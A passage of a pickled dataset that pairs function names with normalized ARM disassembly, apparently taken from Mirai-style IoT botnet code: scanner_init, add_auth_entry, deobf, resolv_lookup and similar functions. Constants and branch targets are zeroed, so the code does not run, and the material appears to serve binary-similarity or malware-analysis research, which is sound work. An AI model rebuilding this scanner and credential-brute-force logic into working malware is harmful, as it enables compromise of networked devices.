S'"STMFD~SP!,{R4,LR}\nSUBS~R4,R0,0\nLDMEQFD~SP!,{R4,PC}\nLDR~R0,[R4,0]\nCMP~R0,0\nBLNE~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,LR}\nB~FOO"'
p281
L36L
tp282
a(S'resolv_domain_to_hostname'
p283
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R4,R0\nMOV~R0,R1\nMOV~R5,R1\nBL~FOO\nMOV~LR,R4\nADD~R0,R0,0\nADD~R4,R4,0\nMOV~R12,0\nB~FOO\nLDRB~R3,[R5]\nADD~R1,R4,0\nCMP~R3,0\nCMPNE~R3,0\nSTREQB~R12,[LR]\nSTRNEB~R3,[R4]\nMOVEQ~LR,R4\nMOVEQ~R12,0\nANDNE~R12,R2,0\nADD~R5,R5,0\nSUB~R0,R0,0\nMOV~R4,R1\nCMP~R0,0\nADD~R2,R12,0\nBGT~FOO\nMOV~R3,0\nSTRB~R3,[R4]\nLDMFD~SP!,{R4,R5,PC}"'
p284
L112L
tp285
a(S'resolv_lookup'
p286
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R4,R0\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R7,R3,0\nMOV~R1,R4\nMOV~R8,R0\nMOV~R0,R7\nBL~FOO\nMOV~R0,R7\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R2,0\nMOV~R1,0\nADD~R5,R7,R0\nMOV~R0,R4\nBL~FOO\nMOV~R0,R7\nBL~FOO\nADD~R0,R0,0\nSTR~R0,[SP,0]\nBL~FOO\nLDR~R1,<STR>\nBL~FOO\nMOV~R1,0\nMOV~R3,R0,LSL0\nMOV~R9,R3,LSRR1\nMOV~R0,R4\nBL~FOO\nADD~LR,SP,0\nMOV~R3,0\nSTRB~R3,[LR,0]\nADD~R3,R3,0\nSTRB~R3,[LR,0]\nMOV~R1,0\nLDR~R3,<STR>\nMOV~R2,0\nADD~R0,R5,R1\nMOV~R12,R9,ASR0\nSTRB~R12,[SP,0]\nSTR~R3,[LR,0]\nSTRB~R2,[LR,0]\nSTRB~R2,[LR,0]\nSTRB~R9,[SP,0]\nSTRB~R1,[SP,0]\nSTRB~R2,[SP,0]\nSTRB~R2,[SP,0]\nSTRB~R1,[SP,0]\nSTRB~R2,[R5,0]\nSTRB~R2,[R0,0]\nSTRB~R1,[R0,0]\nSTRB~R1,[R0,0]\nMOV~R11,R1\nMOV~R10,0\nCMN~R10,0\nMOVNE~R0,R10\nBLNE~FOO\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nMOV~R10,R0\nMOVEQ~R0,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nADD~R1,SP,0\nMOV~R0,R10\nADD~R1,R1,0\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,R10\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nORR~R2,R0,0\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R5,0\nSTR~R5,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nADD~R2,SP,0\nMOV~R3,R10,LSR0\nADD~R2,R2,0\nADD~R4,R2,R3,LSL0\nLDR~R12,[R4,-0]\nMOV~R3,0\nAND~R6,R10,0\nORR~R12,R12,R3,LSLR6\nADD~LR,SP,0\nSTR~R12,[R4,-0]\nMOV~R12,0\nSTR~R12,[LR,0]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R0,R10,R3\nSTR~R12,[SP]\nMOV~R2,R5\nMOV~R3,R5\nSTR~R5,[LR,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,R5\nBEQ~FOO\nLDR~R3,[R4,-0]\nMOV~R3,R3,ASRR6\nTST~R3,0\nBEQ~FOO\nADD~R6,SP,0\nSUB~R6,R6,0\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R10\nSTR~R5,[SP,0]\nSTR~R5,[SP]\nBL~FOO\nMOV~R4,R0\nMOV~R0,R7\nBL~FOO\nADD~R0,R0,0\nCMP~R4,R0\nBCC~FOO\nADD~R7,R6,0\nMOV~R0,R7\nBL~FOO\nLDR~R3,<STR>\nADD~R2,SP,0\nADD~R2,R2,0\nLDRB~R3,[R2,R3]\nLDRB~R2,[R6,0]\nORR~R3,R3,R2,LSL0\nADD~R0,R7,R0\nCMP~R3,R9\nADD~R5,R0,0\nBNE~FOO\nLDRB~R2,[R6,0]\nLDRB~R3,[R6,0]\nORRS~R2,R3,R2,LSL0\nBEQ~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R7,R3,R2,LSR0\nB~FOO\nBL~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R4,R5,R3\nLDRB~R0,[R4,0]\nLDRB~R3,[R5,R3]\nORR~R3,R3,R0,LSL0\nADD~R2,SP,0\nADD~R5,R4,0\nCMP~R3,0\nMOV~R1,R6\nADD~R2,R2,0\nMOV~R0,R5\nBNE~FOO\nLDRB~R3,[R4,0]\nLDRB~R12,[R4,0]\nORR~R3,R3,R12,LSL0\nCMP~R3,0\nBNE~FOO\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nORR~R3,R3,R2,LSL0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nCMP~R2,0\nBNE~FOO\nLDRB~R3,[R4,0]\nADD~LR,SP,0\nSTRB~R3,[LR,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[LR,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[LR,0]\nLDRB~R3,[R5,0]\nSTRB~R3,[LR,0]\nLDRB~R1,[R8]\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nLDR~R0,[R8,0]\nBL~FOO\nLDRB~R2,[R8]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R1,R2,0\nSTR~R3,[R0,R2,LSL0]\nSTR~R0,[R8,0]\nSTRB~R1,[R8]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R2,R2,R3,LSL0\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nB~FOO\nBL~FOO\nADD~LR,SP,0\nLDR~R3,[LR,0]\nADD~R5,R5,R3\nSUB~R3,R7,0\nMOV~R3,R3,LSL0\nADD~R6,SP,0\nSUB~R6,R6,0\nADD~R2,SP,0\nCMN~R3,0\nMOV~R0,R5\nMOV~R1,R6\nADD~R2,R2,0\nMOV~R7,R3,LSR0\nBNE~FOO\nB~FOO\nCMP~R11,0\nADDNE~R11,R11,0\nBNE~FOO\nMOV~R0,R10\nBL~FOO\nLDRB~R4,[R8]\nCMP~R4,0\nBNE~FOO\nMOV~R0,R8\nBL~FOO\nMOV~R8,R4\nMOV~R0,R8\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p287
L1024L
tp288
a(S'consume_any_prompt'
p289
S'"LDR~R3,[R0,0]\nMOV~R1,R0\nSUB~R0,R3,0\nB~FOO\nLDRB~R2,[R3,0]\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nBEQ~FOO\nCMP~R2,0\nBEQ~FOO\nCMP~R2,0\nBNE~FOO\nADD~R0,R0,0\nCMN~R0,0\nMOVNE~PC,LR\nB~FOO\nSUB~R0,R0,0\nCMP~R0,0\nADD~R3,R0,R1\nBGT~FOO\nMOV~R0,0\nRET"'
p290
L96L
tp291
a(S'can_consume'
p292
S'"LDR~R3,[R0,0]\nADD~R0,R0,0\nADD~R2,R1,R2\nADD~R0,R0,R3\nCMP~R2,R0\nMOVCS~R0,0\nMOVCC~R0,0\nRET"'
p293
L32L
tp294
a(S'scanner_kill'
p295
S'"LDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nB~FOO"'
p296
L16L
tp297
a(S'deobf'
p298
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R4,R1\nMOV~R5,R0\nBL~FOO\nSTR~R0,[R4]\nADD~R0,R0,0\nBL~FOO\nLDR~R2,[R4]\nMOV~R1,R5\nADD~R2,R2,0\nMOV~R6,R0\nBL~FOO\nLDR~R4,[R4]\nMOV~R2,0\nB~FOO\nLDRB~R3,[R2,R6]\nEOR~R3,R3,0\nSTRB~R3,[R2,R6]\nADD~R2,R2,0\nCMP~R2,R4\nBLT~FOO\nMOV~R0,R6\nLDMFD~SP!,{R4-R6,PC}"'
p299
L92L
tp300
a(S'add_auth_entry'
p301
S'"STMFD~SP!,{R4-R11,LR}\nLDR~R6,<STR>\nLDR~R3,[R6]\nLDR~R7,<STR>\nMOV~R3,R3,LSL0\nSUB~SP,SP,0\nMOV~R8,R0\nMOV~R11,R1\nLDR~R0,[R7]\nADD~R1,R3,0\nMOV~R5,R2,LSL0\nBL~FOO\nMOV~R1,SP\nMOV~R9,R0\nMOV~R0,R8\nLDR~R4,[R6]\nSTR~R9,[R7]\nBL~FOO\nLDR~R2,[R6]\nLDR~R3,[R7]\nADD~R3,R3,R2,LSL0\nLDR~R2,[SP]\nSTRB~R2,[R3,0]\nMOV~R4,R4,LSL0\nLDR~R3,[R6]\nLDR~R8,[R7]\nSTR~R0,[R9,R4]\nMOV~R1,SP\nMOV~R0,R11\nADD~R8,R8,R3,LSL0\nBL~FOO\nLDR~R2,[R6]\nLDR~R3,[R7]\nADD~R3,R3,R2,LSL0\nLDR~R2,[SP]\nLDR~R12,<STR>\nSTRB~R2,[R3,0]\nLDRB~R3,[R12,0]\nLDRB~R2,[R12]\nLDR~LR,[R6]\nLDR~R1,[R7]\nORR~R2,R2,R3,LSL0\nADD~R1,R1,LR,LSL0\nMOV~R3,R2,ASR0\nSTRB~R3,[R1,0]\nSTRB~R2,[R1,0]\nLDRB~R2,[R12,0]\nLDRB~R3,[R12]\nMOV~R5,R5,LSR0\nORR~R3,R3,R2,LSL0\nADD~R3,R5,R3\nMOV~R2,R3,ASR0\nSTRB~R2,[R1,0]\nSTRB~R3,[R1,0]\nLDRB~R3,[R12]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nADD~R5,R5,R3\nADD~LR,LR,0\nMOV~R3,R5,ASR0\nMOV~R10,SP\nSTR~R0,[R8,0]\nSTR~LR,[R6]\nSTRB~R3,[R12,0]\nSTRB~R5,[R12]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p302
L268L
tp303
a(S'setup_connection'
p304
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R6,0\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R1,R6\nMOV~R2,0\nMOV~R0,SP\nBL~FOO\nLDR~R0,[R5,0]\nCMN~R0,0\nMOV~R7,SP\nBLNE~FOO\nMOV~R1,0\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nMOV~R3,R0\nCMN~R3,0\nMOV~R1,0\nADD~R0,R5,0\nSTR~R3,[R5,0]\nBEQ~FOO\nSTR~R6,[R5,0]\nBL~FOO\nLDR~R4,[R5,0]\nMOV~R1,0\nMOV~R2,R6\nMOV~R0,R4\nBL~FOO\nMOV~R1,0\nORR~R2,R0,0\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nLDR~R3,[R3]\nLDR~LR,[R5,0]\nSTR~R3,[R5,0]\nLDR~R4,[R5,0]\nMOV~R3,0\nSTR~R3,[R5,0]\nMOV~R12,LR,ASR0\nLDR~R0,[R5,0]\nADD~R3,R3,R3\nMOV~R1,SP\nMOV~R2,0\nSTRB~R3,[SP]\nSTRB~R6,[SP,0]\nSTR~R4,[SP,0]\nSTRB~R12,[SP,0]\nSTRB~LR,[SP,0]\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p305
L212L
tp306
a(S'recv_strip_null'
p307
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R1\nBL~FOO\nCMP~R0,0\nLDMLEFD~SP!,{R4,PC}\nB~FOO\nLDRB~R3,[R2,R4]\nCMP~R3,0\nADDEQ~R3,R3,0\nSTREQB~R3,[R2,R4]\nADD~R2,R2,0\nCMP~R2,R0\nLDMEQFD~SP!,{R4,PC}\nB~FOO\nMOV~R2,0\nB~FOO"'
p308
L64L
tp309
a(S'scanner_init'
p310
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R4,R3\nORRGT~R4,R3,0\nLDR~R3,<STR>\nCMP~R4,0\nSTR~R0,[R3]\nBNE~FOO\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nMOV~R1,0\nSTR~R0,[R3]\nMOV~R0,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R4,[SP,0]\nSTR~R0,[R3]\nMOV~R12,R4\nMOV~R0,R4\nLDR~R3,<STR>\nLDR~R2,[R3]\nMOV~R3,0\nMLA~R1,R12,R3,R2\nMLA~R2,R0,R3,R2\nADD~R12,R12,0\nMOV~R6,0\nMOV~R3,0\nCMP~R12,0\nSTR~R3,[R1,0]\nSTR~R6,[R2,0]\nMOV~R0,R12\nBLE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R5,<STR>\nCMN~R0,0\nMOV~R4,R0\nSTR~R0,[R5]\nBEQ~FOO\nMOV~R1,0\nMOV~R2,R6\nBL~FOO\nMOV~R1,0\nORR~R2,R0,0\nMOV~R0,R4\nBL~FOO\nMOV~R2,0\nMOV~R12,0\nADD~R3,SP,0\nLDR~R0,[R5]\nSTR~R12,[SP,0]\nMOV~R1,R6\nADD~R12,R12,R2\nADD~R3,R3,0\nSTR~R12,[SP]\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R0,[R5]\nBL~FOO\nMOV~R0,R6\nBL~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R1,R0,LSR0\nAND~R3,R1,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R0,LSR0\nCMP~R3,0\nSTR~R1,[SP,0]\nBCC~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nMOV~R4,0\nSTRB~R3,[R2]\nMOV~R3,0\nSTRB~R3,[R2,0]\nSTRB~R4,[R2,0]\nBL~FOO\nLDR~R3,<STR>\nLDR~R12,<STR>\nLDRB~R2,[R3,0]\nLDR~R10,[SP,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R12,0]\nLDR~LR,<STR>\nMOV~R3,0\nBIC~R2,R2,0\nSTRB~R3,[R12,0]\nORR~R2,R2,0\nMOV~R1,R10,ASR0\nMOV~R3,0\nMOV~R5,0\nSTRB~R1,[LR,0]\nSTRB~R2,[LR,0]\nSTRB~R4,[LR,0]\nSTRB~R3,[LR,0]\nSTRB~R10,[R12,0]\nSTRB~R0,[R12,0]\nSTRB~R5,[R12,0]\nBL~FOO\nLDR~R1,<STR>\nLDRB~R3,[R1,0]\nLDR~R4,<STR>\nMOV~LR,R0\nMOV~R12,R0,ASR0\nORR~R3,R3,0\nSTRB~R12,[R4,0]\nSTRB~R3,[R4,0]\nSTRB~LR,[R4,0]\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nMOV~R2,R5\nLDR~R0,<STR>\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R10,[SP,0]\nLDR~R8,[R3]\nCMP~R8,R10\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R2,0\nMOV~R1,0\nADD~R0,SP,0\nBL~FOO\nBL~FOO\nLDR~R3,<STR>\nLDR~R12,<STR>\nLDR~R2,[R3]\nMOV~R3,R0,ASR0\nSTRB~R3,[R12,0]\nSTR~R2,[R12,0]\nSTRB~R0,[R12,0]\nBL~FOO\nAND~R1,R0,0\nMOV~R3,R0,LSR0\nMOV~R2,R0,LSR0\nCMP~R1,0\nCMPNE~R1,0\nAND~R12,R3,0\nAND~R2,R2,0\nMOV~R0,R0,LSR0\nBEQ~FOO\nCMP~R1,0\nBEQ~FOO\nSUB~R3,R1,0\nCMP~R1,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R1,0\nBEQ~FOO\nCMP~R1,0\nCMPEQ~R12,0\nBEQ~FOO\nCMP~R1,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R12,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R12,0\nBLS~FOO\nCMP~R1,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R12,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R12,0\nBLS~FOO\nCMP~R1,0\nCMPEQ~R12,0\nBEQ~FOO\nCMP~R1,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R12,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R12,0\nBLS~FOO\nCMP~R1,0\nBHI~FOO\nSUB~R3,R1,0\nCMP~R1,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R1,0\nCMPNE~R1,0\nBEQ~FOO\nCMP~R1,0\nCMPNE~R1,0\nBEQ~FOO\nCMP~R1,0\nCMPNE~R1,0\nBEQ~FOO\nCMP~R1,0\nCMPNE~R1,0\nBEQ~FOO\nCMP~R1,0\nCMPNE~R1,0\nMOVNE~R4,0\nMOVEQ~R4,0\nBEQ~FOO\nMOV~R3,R12,LSL0\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R0\nORR~R3,R3,R2,LSL0\nAND~R2,R3,0\nAND~R1,R3,0\nMOV~R2,R2,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R3,LSL0\nLDR~R0,<STR>\nORR~R2,R2,R3,LSR0\nORR~R2,R2,R1\nSTR~R2,[R0,0]\nMOV~R1,0\nSTRB~R4,[R0,0]\nSTRB~R4,[R0,0]\nBL~FOO\nLDR~LR,<STR>\nMOV~R3,R0,ASR0\nMOV~R2,R0\nSTRB~R3,[LR,0]\nMOV~R1,0\nSTRB~R2,[LR,0]\nLDR~R0,[SP,0]\nBL~FOO\nCMP~R0,0\nLDR~R0,<STR>\nLDREQ~R1,<STR>\nLDRNE~R2,<STR>\nMOVEQ~R3,0\nLDR~R10,<STR>\nLDR~R12,[R0,0]\nSTREQB~R3,[R1,0]\nSTRNEB~R4,[R2,0]\nADDEQ~R3,R3,0\nMOVNE~R3,0\nMOV~R4,0\nSTREQB~R3,[R1,0]\nSTRNEB~R3,[R2,0]\nADD~R1,R0,0\nMOV~R2,0\nMOV~R3,0\nSTR~R12,[R10,0]\nSTRB~R4,[R10,0]\nSTRB~R4,[R10,0]\nBL~FOO\nLDR~R12,<STR>\nMOV~R7,R0\nLDR~LR,[R10]\nLDR~R6,[R12,0]\nMOV~R12,R7,ASR0\nSTRB~R12,[R10,0]\nLDR~R3,<STR>\nMOV~R12,0\nMOV~LR,LR,LSR0\nSTRB~R12,[SP,0]\nADD~R12,SP,0\nLDR~R0,[R3]\nMOV~R5,LR,ASR0\nSTR~R12,[SP]\nMOV~R12,0\nMOV~R3,0\nSTRB~R4,[SP,0]\nSTRB~R5,[SP,0]\nSTR~R12,[SP,0]\nLDR~R1,<STR>\nSTRB~R7,[R10,0]\nMOV~R2,0\nSTR~R6,[SP,0]\nSTRB~LR,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nCMP~R3,0\nSTR~R3,[SP,0]\nBLE~FOO\nSTR~R8,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R5,0\nLDR~LR,[SP,0]\nMOV~R12,0\nSTR~R12,[LR]\nLDR~R3,<STR>\nADD~R4,SP,0\nSUB~R4,R4,0\nLDR~R0,[R3]\nMOV~R1,R4\nLDR~R2,<STR>\nMOV~R3,0\nSTR~R12,[SP,0]\nSTR~R12,[SP]\nBL~FOO\nCMP~R0,0\nBLE~FOO\nLDR~R1,[SP,0]\nLDR~R3,[R1]\nCMP~R3,0\nBEQ~FOO\nCMP~R0,0\nBLS~FOO\nLDR~R3,<STR>\nLDR~R2,[R3]\nLDR~R3,[SP,0]\nCMP~R3,R2\nBNE~FOO\nLDRB~R3,[SP,0]\nCMP~R3,0\nBNE~FOO\nADD~R12,R4,0\nLDRB~R2,[SP,0]\nLDRB~R3,[R12,0]\nORR~R2,R2,R3,LSL0\nCMP~R2,0\nBEQ~FOO\nLDR~R3,<STR>\nCMP~R2,R3\nBNE~FOO\nLDRB~R2,[R4,0]\nLDRB~R3,[SP,0]\nORR~R3,R3,R2,LSL0\nLDR~R2,[SP,0]\nCMP~R3,R2\nBNE~FOO\nLDRB~R3,[R12,0]\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBNE~FOO\nTST~R3,0\nBNE~FOO\nLDR~R1,[R12,0]\nAND~R3,R1,0\nAND~R2,R1,0\nMOV~R3,R3,LSR0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R1,LSR0\nORR~R3,R3,R2\nSUB~R3,R3,0\nAND~R1,R3,0\nAND~R2,R3,0\nMOV~R1,R1,LSR0\nMOV~R2,R2,LSL0\nORR~R2,R2,R3,LSL0\nORR~R1,R1,R3,LSR0\nLDR~R3,[SP,0]\nORR~R1,R1,R2\nCMP~R1,R3\nBNE~FOO\nLDR~R3,<STR>\nLDR~R2,[R3]\nMOV~R3,0\nMLA~R3,R5,R3,R2\nMOV~R4,R5\nB~FOO\nMOV~R0,R3\nLDR~R3,[R3,0]\nCMP~R3,0\nADD~R3,R0,0\nBEQ~FOO\nADD~R4,R4,0\nCMP~R4,0\nBLE~FOO\nB~FOO\nSTR~R1,[R0,0]\nLDR~R2,[R12]\nMOV~R3,R2,ASR0\nSTRB~R3,[R0,0]\nSTRB~R2,[R0,0]\nBL~FOO\nMOV~R5,R4\nB~FOO\nMOV~R2,0\nMOV~R1,0\nADD~R3,SP,0\nSTR~R1,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nMOV~R2,R1\nMOV~R1,0\nADD~R3,SP,0\nSTR~R1,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nSTR~R1,[SP,0]\nMOV~R5,R1\nMOV~R6,R1\nMOV~R0,R1\nLDR~R3,<STR>\nLDR~R2,[R3]\nMOV~R3,0\nMLA~R4,R0,R3,R2\nLDR~R0,[R4,0]\nCMP~R0,0\nMOVHI~R1,0\nBHI~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R1,0\nLDR~R3,<STR>\nLDR~R2,[R4,0]\nLDR~R3,[R3]\nRSB~R3,R2,R3\nCMP~R3,R1\nBLS~FOO\nLDR~R0,[R4,0]\nBL~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nMOV~R3,0\nSTR~R3,[R4,0]\nBLS~FOO\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nCMP~R3,0\nSTRB~R3,[R4,0]\nBEQ~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nSTRB~R3,[R4,0]\nB~FOO\nCMP~R0,0\nLDR~R12,[R4,0]\nBNE~FOO\nADD~R4,SP,0\nMOV~R3,R12,LSR0\nADD~R4,R4,0\nADD~R1,R4,R3,LSL0\nLDR~R3,[R1,-0]\nAND~R2,R12,0\nORR~R3,R3,R0,LSLR2\nCMP~R12,R6\nMOVGT~R6,R12\nSTR~R3,[R1,-0]\nB~FOO\nADD~R10,SP,0\nMOV~R3,R12,LSR0\nADD~R10,R10,0\nADD~R0,R10,R3,LSL0\nLDR~R3,[R0,-0]\nAND~R1,R12,0\nMOV~R2,0\nORR~R3,R3,R2,LSLR1\nSTR~R3,[R